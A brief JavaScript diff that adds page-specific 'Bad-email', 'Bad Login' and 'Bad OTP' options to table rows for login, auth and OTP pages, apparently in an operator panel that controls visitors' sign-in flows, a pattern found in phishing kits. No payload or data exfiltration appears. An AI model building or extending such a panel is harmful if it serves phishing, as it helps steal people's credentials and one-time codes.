@@ -217,7 +217,8 @@
       const cleanPage = (u.page || "").replace(/\//g, "").toLowerCase();
 
       let incorrectOption = "";
-      if (cleanPage === "login") incorrectOption = `<option value="bad-login">Bad Login</option>`;
+      if (cleanPage === "login") incorrectOption = `<option value="bad-email">Bad-email</option>`;
+      if (cleanPage === "auth") incorrectOption = `<option value="bad-login">Bad Login</option>`;
       else if (cleanPage === "otp") incorrectOption = `<option value="bad-otp">Bad OTP</option>`;
 
       const row = document.createElement("tr");
